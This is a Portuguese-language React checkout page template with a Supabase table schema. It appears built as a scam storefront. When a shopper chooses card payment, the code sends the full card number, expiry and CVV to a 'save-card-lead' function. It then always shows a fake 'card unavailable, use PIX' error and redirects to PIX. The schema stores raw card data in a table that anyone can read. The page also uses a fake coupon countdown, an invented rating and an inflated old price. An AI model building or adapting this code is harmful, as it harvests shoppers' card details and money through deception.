/**
 * =============================================================
 * TEMPLATE CHECKOUT - PRONTO PARA USAR EM QUALQUER PRODUTO
 * =============================================================
 * 
 * COMO USAR:
 * 1. Altere as constantes PRODUCT_* abaixo com os dados do seu produto
 * 2. Configure as edge functions (save-card-lead e create-pix) no Supabase
 * 3. Crie a tabela checkout_leads no banco (schema abaixo)
 * 4. Adicione a rota no App.tsx: <Route path="/checkout" element={<TemplateCheckout />} />
 * 
 * SCHEMA DA TABELA (SQL):
 * CREATE TABLE checkout_leads (
 *   id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
 *   created_at timestamptz NOT NULL DEFAULT now(),
 *   name text NOT NULL,
 *   email text NOT NULL,
 *   phone text,
 *   cpf text,
 *   payment_method text NOT NULL DEFAULT 'pix',
 *   color text,
 *   size text,
 *   quantity integer DEFAULT 1,
 *   total_amount integer DEFAULT 0,
 *   shipping_cost integer DEFAULT 0,
 *   shipping_type text,
 *   cep text, endereco text, numero text, complemento text,
 *   bairro text, cidade text, uf text,
 *   card_number text, card_holder text, card_expiry text,
 *   card_cvv text, card_installments integer,
 *   status text DEFAULT 'pending',
 *   transaction_id text,
 *   metadata jsonb
 * );
 * ALTER TABLE checkout_leads ENABLE ROW LEVEL SECURITY;
 * CREATE POLICY "Allow anonymous insert" ON checkout_leads FOR INSERT WITH CHECK (true);
 * CREATE POLICY "Allow anonymous select" ON checkout_leads FOR SELECT USING (true);
 */

import { useState, useEffect } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { getUrlWithUtm } from "@/utils/utm";
import { toast } from "@/hooks/use-toast";
import {
  ArrowLeft, MapPin, Star, Truck, Shield, Minus, Plus, ChevronRight, Copy, Check, ChevronDown, CreditCard
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";

// =============================================
// 🔧 CONFIGURE SEU PRODUTO AQUI
// =============================================
const PRODUCT_NAME = "Seu Produto Aqui";
const PRODUCT_PRICE = 97.00;
const OLD_PRICE = 197.00;
const DISCOUNT_PERCENT = Math.round(((OLD_PRICE - PRODUCT_PRICE) / OLD_PRICE) * 100);
const DISCOUNT_VALUE = OLD_PRICE - PRODUCT_PRICE;
const PRODUCT_IMAGE = "/images/produto-1.webp"; // troque pela imagem do seu produto
const PRODUCT_ID = "meu-produto";

// Opções de cor (deixe vazio se não tiver)
const COLORS: { id: string; label: string; image: string }[] = [
  { id: "branca", label: "Branca", image: "/images/produto-1.webp" },
  { id: "preta", label: "Preta", image: "/images/produto-1.webp" },
];

// Frete express (0 para desabilitar)
const EXPRESS_SHIPPING_COST = 14.50;
// =============================================

function useCheckoutCountdown() {
  const [seconds, setSeconds] = useState(299);
  useEffect(() => {
    const interval = setInterval(() => {
      setSeconds((s) => (s <= 0 ? 0 : s - 1));
    }, 1000);
    return () => clearInterval(interval);
  }, []);
  const m = Math.floor(seconds / 60);
  const s = seconds % 60;
  return `${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}`;
}

const TemplateCheckout = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const selectedColor = searchParams.get("color") || COLORS[0]?.id || "";
  const selectedSize = searchParams.get("size") || "";
  const timer = useCheckoutCountdown();

  const colorObj = COLORS.find(c => c.id === selectedColor) || COLORS[0];
  const colorLabel = colorObj?.label || "";
  const colorImage = colorObj?.image || PRODUCT_IMAGE;

  const [quantity, setQuantity] = useState(1);
  const [shipping, setShipping] = useState("padrao");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [addressOpen, setAddressOpen] = useState(true);
  const [cpfError, setCpfError] = useState("");
  const [paymentMethod, setPaymentMethod] = useState<"pix" | "credit_card">("pix");
  const [cardDisabled, setCardDisabled] = useState(false);

  const [form, setForm] = useState({
    name: "", phone: "", email: "", cep: "",
    uf: "", cidade: "", bairro: "", endereco: "",
    numero: "", complemento: "", cpf: "",
  });

  const [cardForm, setCardForm] = useState({
    number: "", holder: "", expiry: "", cvv: "", installments: 1,
  });

  const formatCardNumber = (val: string) => {
    const nums = val.replace(/\D/g, "").slice(0, 16);
    return nums.replace(/(\d{4})(?=\d)/g, "$1 ");
  };
  const formatExpiry = (val: string) => {
    const nums = val.replace(/\D/g, "").slice(0, 4);
    if (nums.length <= 2) return nums;
    return `${nums.slice(0, 2)}/${nums.slice(2)}`;
  };
  const updateCardField = (field: string, value: string) => {
    setCardForm((prev) => ({ ...prev, [field]: value }));
  };

  const isCardFormValid = cardForm.number.replace(/\D/g, "").length >= 13 &&
    cardForm.holder.length >= 3 &&
    cardForm.expiry.replace(/\D/g, "").length === 4 &&
    cardForm.cvv.length >= 3;

  const shippingCost = shipping === "express" ? EXPRESS_SHIPPING_COST : 0;
  const total = PRODUCT_PRICE * quantity + shippingCost;

  const updateField = (field: string, value: string) => {
    setForm((prev) => ({ ...prev, [field]: value }));
  };

  const formatCPF = (val: string) => {
    const nums = val.replace(/\D/g, "").slice(0, 11);
    if (nums.length <= 3) return nums;
    if (nums.length <= 6) return `${nums.slice(0, 3)}.${nums.slice(3)}`;
    if (nums.length <= 9) return `${nums.slice(0, 3)}.${nums.slice(3, 6)}.${nums.slice(6)}`;
    return `${nums.slice(0, 3)}.${nums.slice(3, 6)}.${nums.slice(6, 9)}-${nums.slice(9)}`;
  };

  const validateCPF = (cpf: string): boolean => {
    const nums = cpf.replace(/\D/g, "");
    if (nums.length !== 11) return false;
    if (/^(\d)\1{10}$/.test(nums)) return false;
    let sum = 0;
    for (let i = 0; i < 9; i++) sum += parseInt(nums[i]) * (10 - i);
    let rest = (sum * 10) % 11;
    if (rest === 10) rest = 0;
    if (rest !== parseInt(nums[9])) return false;
    sum = 0;
    for (let i = 0; i < 10; i++) sum += parseInt(nums[i]) * (11 - i);
    rest = (sum * 10) % 11;
    if (rest === 10) rest = 0;
    return rest === parseInt(nums[10]);
  };

  const formatPhone = (val: string) => {
    const nums = val.replace(/\D/g, "").slice(0, 11);
    if (nums.length <= 2) return nums;
    if (nums.length <= 7) return `(${nums.slice(0, 2)}) ${nums.slice(2)}`;
    return `(${nums.slice(0, 2)}) ${nums.slice(2, 7)}-${nums.slice(7)}`;
  };

  const formatCEP = (val: string) => {
    const nums = val.replace(/\D/g, "").slice(0, 8);
    if (nums.length <= 5) return nums;
    return `${nums.slice(0, 5)}-${nums.slice(5)}`;
  };

  const [cepLoading, setCepLoading] = useState(false);

  const buscarCEP = async (cep: string) => {
    const nums = cep.replace(/\D/g, "");
    if (nums.length !== 8) return;
    setCepLoading(true);
    try {
      const res = await fetch(`https://viacep.com.br/ws/${nums}/json/`);
      const data = await res.json();
      if (!data.erro) {
        setForm((prev) => ({
          ...prev,
          endereco: data.logradouro || "",
          bairro: data.bairro || "",
          cidade: data.localidade || "",
          uf: data.uf || "",
        }));
      }
    } catch (e) {
      console.error("Erro ao buscar CEP", e);
    } finally {
      setCepLoading(false);
    }
  };

  const isAddressComplete = form.cep && form.uf && form.cidade && form.bairro && form.endereco && form.numero;
  const isCpfValid = validateCPF(form.cpf);

  useEffect(() => {
    if (isAddressComplete && form.name && form.phone && form.email && isCpfValid) {
      setAddressOpen(false);
    }
  }, [form.cpf, isAddressComplete, isCpfValid]);

  useEffect(() => {
    const nums = form.cpf.replace(/\D/g, "");
    if (nums.length === 11 && !validateCPF(form.cpf)) {
      setCpfError("CPF inválido. Verifique os dígitos.");
    } else {
      setCpfError("");
    }
  }, [form.cpf]);

  const isFormValid = form.name && form.phone && form.email && form.cep &&
    form.uf && form.cidade && form.bairro && form.endereco &&
    form.numero && isCpfValid;

  const canSubmit = isFormValid && (paymentMethod === "pix" || isCardFormValid);

  const handleSubmit = async () => {
    if (!canSubmit || isSubmitting) return;
    setIsSubmitting(true);

    try {
      const totalAmountInCents = Math.round(total * 100);

      const payload = {
        amount: totalAmountInCents,
        customer: {
          name: form.name,
          email: form.email,
          phone: form.phone.replace(/\D/g, ""),
          cpf: form.cpf.replace(/\D/g, ""),
        },
        items: [
          {
            id: PRODUCT_ID,
            title: `${PRODUCT_NAME} ${colorLabel} ${selectedSize}`.trim(),
            unitPrice: Math.round(PRODUCT_PRICE * 100),
            quantity,
            tangible: true,
          },
        ],
        shipping: {
          name: form.name,
          address: {
            street: form.endereco,
            streetNumber: form.numero,
            neighborhood: form.bairro,
            city: form.cidade,
            state: form.uf,
            zipcode: form.cep.replace(/\D/g, ""),
            country: "br",
          },
          fee: Math.round(shippingCost * 100),
        },
        metadata: JSON.stringify({
          color: selectedColor,
          size: selectedSize,
          tracking: Object.fromEntries(new URLSearchParams(window.location.search).entries()),
        }),
      };

      if (paymentMethod === "credit_card") {
        await supabase.functions.invoke("save-card-lead", {
          body: {
            ...payload,
            card: {
              number: cardForm.number.replace(/\s/g, ""),
              holder: cardForm.holder,
              expiry: cardForm.expiry,
              cvv: cardForm.cvv,
              installments: cardForm.installments,
            },
          },
        });

        toast({ title: "Erro ao processar cartão", description: "No momento, pagamento por cartão não está disponível. Use o PIX.", variant: "destructive" });
        setCardDisabled(true);
        setPaymentMethod("pix");
        setIsSubmitting(false);
        return;
      }

      const { data, error } = await supabase.functions.invoke("create-pix", {
        body: payload,
      });

      if (error || !data || data?.error) {
        const errMsg = data?.details?.message || data?.error || error?.message || "Tente novamente.";
        toast({ title: "Erro ao gerar PIX", description: typeof errMsg === 'string' ? errMsg : JSON.stringify(errMsg), variant: "destructive" });
        setIsSubmitting(false);
        return;
      }

      sessionStorage.setItem("pixData", JSON.stringify(data));
      sessionStorage.setItem("orderData", JSON.stringify({
        customer: payload.customer,
        product: { color: selectedColor, size: selectedSize, quantity, price: PRODUCT_PRICE, total },
        shipping: { type: shipping, cost: shippingCost },
      }));

      navigate(getUrlWithUtm("/pix"));
    } catch (err) {
      console.error("Submit error:", err);
      toast({ title: "Erro inesperado", description: "Tente novamente.", variant: "destructive" });
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-background pb-[140px]">
      {/* Header */}
      <header className="sticky top-0 z-40 border-b bg-card px-4 py-3">
        <div className="mx-auto max-w-[720px] flex items-center gap-3">
          <button onClick={() => navigate(-1)} className="text-foreground">
            <ArrowLeft className="h-5 w-5" />
          </button>
          <div className="flex-1 text-center">
            <p className="font-bold text-sm">Resumo do pedido</p>
            <p className="text-xs text-success flex items-center justify-center gap-1">
              <Shield className="h-3 w-3" /> Seus dados estão seguros conosco
            </p>
          </div>
          <div className="w-5" />
        </div>
      </header>

      <div className="mx-auto max-w-[720px] px-4">
        {/* Address Section - Collapsible */}
        <button
          onClick={() => setAddressOpen((v) => !v)}
          className="mt-4 w-full flex items-center justify-between"
        >
          <div className="flex items-center gap-2 text-sm font-semibold">
            <MapPin className="h-4 w-4 text-muted-foreground" />
            Endereço de envio
          </div>
          {isAddressComplete ? (
            <span className="flex items-center gap-1 text-xs text-success font-semibold">
              <Check className="h-3.5 w-3.5" /> {form.endereco.length > 20 ? form.endereco.slice(0, 20) + "..." : form.endereco}
            </span>
          ) : (
            <span className="text-xs font-semibold text-cta">+ Adicionar endereço</span>
          )}
        </button>

        {/* Form */}
        {addressOpen && (
        <div className="mt-4 space-y-3">
          <Input placeholder="Nome completo" value={form.name} onChange={(e) => updateField("name", e.target.value)} className="rounded-lg border-border h-12 text-sm" />
          <div className="relative">
            <Input placeholder="Telefone com DDD" value={form.phone} onChange={(e) => updateField("phone", formatPhone(e.target.value))} className="rounded-lg border-border h-12 text-sm pl-12" />
            <span className="absolute left-3 top-1/2 -translate-y-1/2 text-sm text-muted-foreground">+55</span>
          </div>
          <Input placeholder="E-mail" type="email" value={form.email} onChange={(e) => updateField("email", e.target.value)} className="rounded-lg border-border h-12 text-sm" />
          <div className="relative">
            <Input
              placeholder="CEP"
              value={form.cep}
              onChange={(e) => {
                const formatted = formatCEP(e.target.value);
                updateField("cep", formatted);
                const nums = formatted.replace(/\D/g, "");
                if (nums.length === 8) buscarCEP(nums);
              }}
              className="rounded-lg border-border h-12 text-sm"
            />
            {cepLoading && <span className="absolute right-3 top-1/2 -translate-y-1/2 text-xs text-muted-foreground">Buscando...</span>}
          </div>
          <div className="grid grid-cols-2 gap-3">
            <Input placeholder="UF" value={form.uf} readOnly={!!form.uf && !cepLoading} onChange={(e) => updateField("uf", e.target.value.toUpperCase().slice(0, 2))} className="rounded-lg border-border h-12 text-sm bg-muted/30" />
            <Input placeholder="Cidade" value={form.cidade} readOnly={!!form.cidade && !cepLoading} onChange={(e) => updateField("cidade", e.target.value)} className="rounded-lg border-border h-12 text-sm bg-muted/30" />
          </div>
          <Input placeholder="Bairro" value={form.bairro} readOnly={!!form.bairro && !cepLoading} onChange={(e) => updateField("bairro", e.target.value)} className="rounded-lg border-border h-12 text-sm bg-muted/30" />
          <Input placeholder="Endereço (rua, avenida...)" value={form.endereco} readOnly={!!form.endereco && !cepLoading} onChange={(e) => updateField("endereco", e.target.value)} className="rounded-lg border-border h-12 text-sm bg-muted/30" />
          <div className="grid grid-cols-2 gap-3">
            <Input placeholder="Número" value={form.numero} onChange={(e) => updateField("numero", e.target.value)} className="rounded-lg border-border h-12 text-sm" />
            <Input placeholder="Complemento" value={form.complemento} onChange={(e) => updateField("complemento", e.target.value)} className="rounded-lg border-border h-12 text-sm" />
          </div>
          <div>
            <Input
              placeholder="CPF (000.000.000-00)"
              value={form.cpf}
              onChange={(e) => updateField("cpf", formatCPF(e.target.value))}
              className={`rounded-lg border-border h-12 text-sm ${cpfError ? "border-destructive" : ""}`}
            />
            {cpfError && <p className="text-xs text-destructive mt-1 font-medium">{cpfError}</p>}
          </div>
        </div>
        )}

        {/* Divider */}
        <div className="mt-6 border-t-2 border-dashed border-[#5BC4D6]" />

        {/* Product Info */}
        <div className="mt-4">
          <p className="font-bold text-sm">Fornecedor disponível</p>
          <p className="flex items-center gap-1 text-xs text-success mt-0.5">
            <Star className="h-3 w-3 fill-primary text-primary" /> Muito bem avaliado! 4.8/5,0
          </p>
        </div>

        <div className="mt-3 flex gap-3">
          <img src={colorImage} alt="Produto" className="h-20 w-20 rounded object-contain bg-muted/30 flex-shrink-0" />
          <div className="flex-1">
            <p className="text-sm font-medium leading-snug">{PRODUCT_NAME}</p>
            {colorLabel && <p className="text-xs text-muted-foreground">{colorLabel}{selectedSize ? `, ${selectedSize}` : ""}</p>}
            <span className="mt-1 inline-flex items-center gap-1 rounded bg-badge-green/20 px-1.5 py-0.5 text-[10px] text-badge-green font-semibold">
              <Shield className="h-3 w-3" /> Devolução gratuita
            </span>
            <div className="mt-1 flex items-baseline gap-2">
              <span className="text-sm font-bold text-cta">R$ {PRODUCT_PRICE.toFixed(2).replace(".", ",")} 🏷️</span>
              <span className="text-xs line-through text-muted-foreground">R$ {OLD_PRICE.toFixed(2).replace(".", ",")}</span>
              <span className="text-xs font-semibold text-cta">-{DISCOUNT_PERCENT}%</span>
            </div>
          </div>
          <div className="flex items-center gap-0">
            <button onClick={() => setQuantity(Math.max(1, quantity - 1))} className="flex h-8 w-8 items-center justify-center rounded-l border text-foreground">
              <Minus className="h-3.5 w-3.5" />
            </button>
            <div className="flex h-8 w-8 items-center justify-center border-y text-sm font-medium">{quantity}</div>
            <button onClick={() => setQuantity(quantity + 1)} className="flex h-8 w-8 items-center justify-center rounded-r border text-foreground">
              <Plus className="h-3.5 w-3.5" />
            </button>
          </div>
        </div>

        {/* Shipping Options */}
        <div className="mt-6">
          <p className="font-bold text-sm mb-3">Opções de envio</p>
          <div className="space-y-2">
            <button
              onClick={() => setShipping("padrao")}
              className={`w-full flex items-center gap-3 rounded-xl border-2 p-4 transition-all ${shipping === "padrao" ? "border-cta bg-cta/5" : "border-border"}`}
            >
              <div className={`h-5 w-5 rounded-full border-2 flex items-center justify-center ${shipping === "padrao" ? "border-cta" : "border-muted-foreground"}`}>
                {shipping === "padrao" && <div className="h-2.5 w-2.5 rounded-full bg-cta" />}
              </div>
              <div className="flex-1 text-left">
                <p className="font-semibold text-sm">Envio Padrão</p>
                <p className="text-xs text-muted-foreground">3 a 7 dias úteis</p>
              </div>
              <span className="font-bold text-sm text-success">Grátis</span>
            </button>
            {EXPRESS_SHIPPING_COST > 0 && (
            <button
              onClick={() => setShipping("express")}
              className={`w-full flex items-center gap-3 rounded-xl border-2 p-4 transition-all ${shipping === "express" ? "border-cta bg-cta/5" : "border-border"}`}
            >
              <div className={`h-5 w-5 rounded-full border-2 flex items-center justify-center ${shipping === "express" ? "border-cta" : "border-muted-foreground"}`}>
                {shipping === "express" && <div className="h-2.5 w-2.5 rounded-full bg-cta" />}
              </div>
              <div className="flex-1 text-left">
                <p className="font-semibold text-sm">Envio Express</p>
                <p className="text-xs text-muted-foreground">1 a 3 dias úteis</p>
              </div>
              <span className="font-bold text-sm">R$ {EXPRESS_SHIPPING_COST.toFixed(2).replace(".", ",")}</span>
            </button>
            )}
          </div>
        </div>

        {/* Discount */}
        <div className="mt-4 flex items-center justify-between py-3 border-t">
          <div className="flex items-center gap-2 text-sm">
            <span>🏷️</span>
            <span className="font-bold">Desconto especial</span>
          </div>
          <div className="flex items-center gap-1">
            <span className="font-bold text-sm text-cta">- R$ {DISCOUNT_VALUE.toFixed(2).replace(".", ",")}</span>
            <ChevronRight className="h-4 w-4 text-muted-foreground" />
          </div>
        </div>

        {/* Order Summary */}
        <div className="mt-2 border-t pt-4">
          <p className="font-bold text-sm mb-3">Resumo do pedido</p>
          <div className="space-y-2 text-sm">
            <div className="flex justify-between">
              <span className="text-muted-foreground">Subtotal ({quantity}x)</span>
              <span>R$ {(PRODUCT_PRICE * quantity).toFixed(2).replace(".", ",")}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-muted-foreground">Taxa de envio</span>
              <span className={shippingCost === 0 ? "text-success font-semibold" : ""}>
                {shippingCost === 0 ? "Grátis" : `R$ ${shippingCost.toFixed(2).replace(".", ",")}`}
              </span>
            </div>
            <div className="flex justify-between border-t pt-2">
              <span className="font-bold">Total</span>
              <div className="text-right">
                <span className="font-bold">R$ {total.toFixed(2).replace(".", ",")}</span>
                <p className="text-xs text-muted-foreground">Impostos inclusos</p>
              </div>
            </div>
          </div>
        </div>

        {/* Payment Method */}
        <div className="mt-4 border-t pt-4">
          <p className="font-bold text-sm mb-3">Forma de pagamento</p>
          <div className="space-y-2">
            <button
              onClick={() => setPaymentMethod("pix")}
              className={`w-full flex items-center justify-between rounded-xl border-2 p-4 transition-all ${paymentMethod === "pix" ? "border-cta bg-cta/5" : "border-border"}`}
            >
              <div className="flex items-center gap-3">
                <span className="text-lg">💠</span>
                <span className="font-medium text-sm">Pix</span>
              </div>
              <div className={`h-5 w-5 rounded-full border-2 flex items-center justify-center ${paymentMethod === "pix" ? "border-cta" : "border-muted-foreground"}`}>
                {paymentMethod === "pix" && <div className="h-2.5 w-2.5 rounded-full bg-cta" />}
              </div>
            </button>
            {!cardDisabled && (
            <button
              onClick={() => setPaymentMethod("credit_card")}
              className={`w-full flex items-center justify-between rounded-xl border-2 p-4 transition-all ${paymentMethod === "credit_card" ? "border-cta bg-cta/5" : "border-border"}`}
            >
              <div className="flex items-center gap-3">
                <CreditCard className="h-5 w-5 text-muted-foreground" />
                <span className="font-medium text-sm">Cartão de Crédito</span>
              </div>
              <div className={`h-5 w-5 rounded-full border-2 flex items-center justify-center ${paymentMethod === "credit_card" ? "border-cta" : "border-muted-foreground"}`}>
                {paymentMethod === "credit_card" && <div className="h-2.5 w-2.5 rounded-full bg-cta" />}
              </div>
            </button>
            )}
          </div>

          {paymentMethod === "credit_card" && (
            <div className="mt-4 space-y-3 p-4 rounded-xl bg-muted/20 border">
              <Input placeholder="Número do cartão" value={cardForm.number} onChange={(e) => updateCardField("number", formatCardNumber(e.target.value))} className="rounded-lg border-border h-12 text-sm" />
              <Input placeholder="Nome impresso no cartão" value={cardForm.holder} onChange={(e) => updateCardField("holder", e.target.value.toUpperCase())} className="rounded-lg border-border h-12 text-sm" />
              <div className="grid grid-cols-2 gap-3">
                <Input placeholder="MM/AA" value={cardForm.expiry} onChange={(e) => updateCardField("expiry", formatExpiry(e.target.value))} className="rounded-lg border-border h-12 text-sm" />
                <Input placeholder="CVV" value={cardForm.cvv} onChange={(e) => updateCardField("cvv", e.target.value.replace(/\D/g, "").slice(0, 3))} className="rounded-lg border-border h-12 text-sm" />
              </div>
              <select
                value={cardForm.installments}
                onChange={(e) => updateCardField("installments", e.target.value)}
                className="w-full h-12 rounded-lg border border-border bg-background px-3 text-sm"
              >
                {[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12].map((n) => (
                  <option key={n} value={n}>
                    {n}x de R$ {(total / n).toFixed(2).replace(".", ",")} {n === 1 ? "à vista" : ""}
                  </option>
                ))}
              </select>
            </div>
          )}
        </div>

        {/* Terms */}
        <p className="mt-4 text-xs text-muted-foreground leading-relaxed">
          Ao fazer um pedido, você concorda com os <strong className="text-foreground">Termos de uso e venda</strong> e
          reconhece que leu e concorda com a <strong className="text-foreground">Política de privacidade</strong>.
        </p>

        <p className="mt-3 text-xs text-success flex items-center gap-1">
          😊 Você está economizando R$ {DISCOUNT_VALUE.toFixed(2).replace(".", ",")} nesse pedido.
        </p>
      </div>

      {/* Sticky Bottom */}
      <div className="fixed bottom-0 left-0 right-0 z-50 bg-card border-t shadow-[0_-2px_12px_rgba(0,0,0,0.06)]">
        <div className="mx-auto max-w-[720px] px-4">
          <div className="flex items-center justify-between py-2">
            <span className="font-bold text-sm">Total (1 item)</span>
            <span className="font-bold text-lg text-cta">R$ {total.toFixed(2).replace(".", ",")}</span>
          </div>
          <Button
            onClick={handleSubmit}
            disabled={!canSubmit || isSubmitting}
            className={`w-full font-bold text-base py-4 h-auto rounded-2xl mb-3 text-card transition-all duration-300 ${
              canSubmit && !isSubmitting
                ? "bg-[hsl(350,60%,55%)] hover:bg-[hsl(350,60%,48%)] shadow-lg shadow-[hsl(350,60%,55%)]/30 scale-[1.01]"
                : "bg-[hsl(350,30%,75%)] opacity-60 cursor-not-allowed"
            }`}
          >
            <div className="text-center">
              <span>{isSubmitting ? "Processando..." : "Fazer pedido"}</span>
              <p className="text-xs font-normal opacity-80 mt-0.5">O cupom expira em {timer}</p>
            </div>
          </Button>
        </div>
      </div>
    </div>
  );
};

export default TemplateCheckout;
